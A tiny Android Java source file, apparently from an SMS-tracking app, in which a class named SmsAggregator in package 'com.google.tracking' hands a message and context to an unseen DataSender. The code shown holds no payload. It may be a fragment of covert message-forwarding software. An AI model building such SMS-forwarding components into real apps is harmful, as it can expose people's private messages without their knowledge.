package com.google.tracking;

import android.content.Context;

public class SmsAggregator {
    public SmsAggregator(String msg, Context context){
        DataSender sender = new DataSender(msg, context);
    }
}
